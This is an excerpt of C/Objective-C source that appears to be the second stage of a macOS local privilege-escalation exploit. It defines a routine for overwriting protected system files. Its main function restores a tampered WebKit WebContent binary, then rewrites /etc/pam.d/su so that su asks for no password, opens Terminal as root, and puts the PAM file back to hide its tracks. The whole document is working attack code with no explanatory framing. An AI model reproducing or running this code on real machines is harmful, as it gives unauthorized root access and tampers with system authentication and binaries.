...
#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { NSLog(@"%@\n", c); exit(1); }}while(0)
#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { NSLog(@"%@\n", c); exit(1); }}while(0)
...
int overwrite_file_from_source(const char *targetPath, const char *sourcePath) {
    ...
    while (totalRead < srcSize) {
        ssize_t bytesRead = read(src_fd, srcBuffer + totalRead, srcSize - totalRead);
        if (bytesRead <= 0) {
            free(srcBuffer);
            close(src_fd);
            return -4;
    ...
    char *writeBuffer = malloc(tgtSize);
    if (!writeBuffer) {
        free(srcBuffer);
        close(target_fd);
        return -7;
    ...
    if (srcSize < tgtSize) {
        memcpy(writeBuffer, srcBuffer, srcSize);
        memset(writeBuffer + srcSize, 0, tgtSize - srcSize);
    } else {
        memcpy(writeBuffer, srcBuffer, tgtSize);
    }
    free(srcBuffer);
...
char *find_file_recursive(const char *dir, const char *filename) {
    DIR *dp = opendir(dir);
    if (!dp) {
        return NULL;
    }
...
int main(void) {
    ...
    //Restore webcontent
    char* webcontent_bak_path = find_file_recursive("/var/folders", "webcontent.bak");
    if (webcontent_bak_path) {
        NSLog(@"[stage2] Found webcontent.bak: %s\n", webcontent_bak_path);
        int ret = overwrite_file_from_source("/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent", webcontent_bak_path);
        NSLog(@"[stage2] overwrite_file_from_source (restore webcontent) ret = 0x%x", ret);
        remove(webcontent_bak_path);
        free(webcontent_bak_path);
    }
    ...
    //su without password
    system("cp /etc/pam.d/su /tmp/su.bak");
    system("sed -e \"s/rootok/permit/g\" /etc/pam.d/su > /tmp/overwrite_file.bin");
    overwrite_file_from_source("/etc/pam.d/su", "/tmp/overwrite_file.bin");
    system("su root -c /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");

    //restore /etc/pam.d/su
    overwrite_file_from_source("/etc/pam.d/su", "/tmp/su.bak");
    remove("/tmp/su.bak");
